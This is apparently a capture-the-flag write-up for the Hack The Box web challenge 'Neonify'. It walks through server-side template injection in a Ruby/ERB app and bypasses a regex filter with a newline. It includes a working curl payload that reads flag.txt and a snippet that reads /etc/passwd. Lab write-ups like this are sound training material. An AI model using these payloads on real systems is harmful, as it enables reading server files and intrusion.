# HTB-Challenges-Web-Neonify

## Challenge Description
It's time for a shiny new reveal for the first-ever text neonifier. Come test out our brand new website and make any text glow like a lo-fi neon tube!

![Screen Shot 2023-12-07 at 05 07 48](https://github.com/patzj/HTB-Challenges-Web-Neonify/assets/10325457/ddc1b532-62e7-406f-96a6-b9098213469d)

## Reconnaissance
Examining the challenge's source code reveals that the application is coded in Ruby, a programming language with which I lack any experience. Moreover, there are conspicuous indications of template injection, strongly suggesting that the challenge will likely center around exploiting this vulnerability.
```erb
<form action="/" method="post">
    <p>Enter Text to Neonify</p><br>
    <input type="text" name="neon" value="">
    <input type="submit" value="Submit">
</form>
<h1 class="glow"><%= @neon %></h1>
```

The vulnerable endpoint is also protected by regex. This made me think it's going to be tough because, even if I try to URL-encode the payload, I can't get past the set pattern.
```rb
post '/' do
  if params[:neon] =~ /^[0-9a-z ]+$/i
    @neon = ERB.new(params[:neon]).result(binding)
  else
    @neon = "Malicious Input Detected"
  end
```

## Scanning
Even though the app has some security measures, I still attempted to check for template injection using this code `<%= 7 * 7 %>` or `%3C%25%3D%207%20%2A%207%20%25%3E`. Unfortunately, it didn't do the trick. I have to come up with a more creative approach.

![Screen Shot 2023-12-07 at 05 35 36](https://github.com/patzj/HTB-Challenges-Web-Neonify/assets/10325457/fa1817c3-131b-4607-a7f4-f12d0539651f)

As a software developer, one of our strengths is finding solutions through *Googling*. I quickly came across a blog discussing a line-feed bypass in Ruby regex. If you're interested, you can check it out at this link: https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/.

## Exploitation
Now that I figured out how to get around the app's protection, I need to find a way to add my own code. Since I can't use the app directly, I'm using a tool called `curl`. I found a code snippet that can read a file on the server: `<%= File.open('/etc/passwd').read %>`. The last step is to piece everything together and send it as my payload.

```sh
curl -X POST -d 'neon=shiftentertonextline
%3C%25%3D%20File%2Eopen%28%27flag%2Etxt%27%29%2Eread%20%25%3E' http://127.0.0.1:1337
```

Flag captured!

```html
<!DOCTYPE html>
<html>
<head>
    <title>Neonify</title>
    <link rel="stylesheet" href="stylesheets/style.css">
    <link rel="icon" type="image/gif" href="/images/gem.gif">
</head>
<body>
    <div class="wrapper">
        <h1 class="title">Amazing Neonify Generator</h1>
        <form action="/" method="post">
            <p>Enter Text to Neonify</p><br>
            <input type="text" name="neon" value="">
            <input type="submit" value="Submit">
        </form>
        <h1 class="glow">shiftentertonextline
HTB{f4k3_fl4g_f0r_t3st1ng}</h1>
    </div>
</body>
</html>
```

## Post-Exploitation
Even a seemingly impenetrable regex has its own weak spot. As a software developer, this challenge is a reminder to always implement a defense-in-depth strategy, such as performing syntactic and semantic checks of user input, employing context-aware output encoding, and implementing the least privilege principle, to name a few. This way, the weakness of one defense can be supplemented by other defenses, making the system more secure.
